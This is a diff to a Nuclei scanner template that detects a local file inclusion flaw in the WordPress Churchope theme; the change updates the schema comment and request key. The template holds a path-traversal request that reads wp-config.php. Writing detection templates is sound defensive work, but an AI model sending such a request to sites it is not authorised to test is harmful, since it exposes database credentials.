@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: churchope-lfi
 
 info:
@@ -8,7 +9,7 @@ info:
   reference: https://wpscan.com/vulnerability/3c5833bd-1fe0-4eba-97aa-7d3a0c8fda15
   tags: wordpress,wp-theme,lfi,wp
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php'
